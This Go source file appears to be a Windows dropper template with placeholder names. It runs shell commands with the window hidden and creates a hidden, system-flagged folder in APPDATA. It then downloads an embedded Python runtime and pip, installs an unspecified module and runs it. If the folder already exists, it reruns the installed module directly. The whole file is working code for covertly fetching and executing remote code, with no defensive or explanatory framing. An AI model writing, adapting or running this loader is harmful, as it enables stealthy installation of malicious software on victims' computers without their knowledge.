package main

import (
	"os"
	"os/exec"
	"syscall"
)

func s(t string) {
	c := exec.Command("cmd", "/c", t)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c.Run()
}

func main() {
	var r string = "RANDOMFOLDER"
	s("ADDON")
	os.Chdir(os.Getenv("APPDATA"))
	_, err := os.Stat(r)
	if err == nil {
		os.Chdir(r)
		s("python -m RUNMODULENAME ARGS")
	} else if os.IsNotExist(err) {
		os.Mkdir(r, os.ModePerm)
		s("attrib +h +s +r " + r)
		os.Chdir(r)
		s("curl -s https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-win32.zip -o PYTHONZIP & tar -xf PYTHONZIP & echo import site >> python312._pth & curl -s https://bootstrap.pypa.io/get-pip.py -O & python get-pip.py & Scripts\\pip install INSTALLMODULENAME & python -m RUNMODULENAME ARGS)")
	}
}
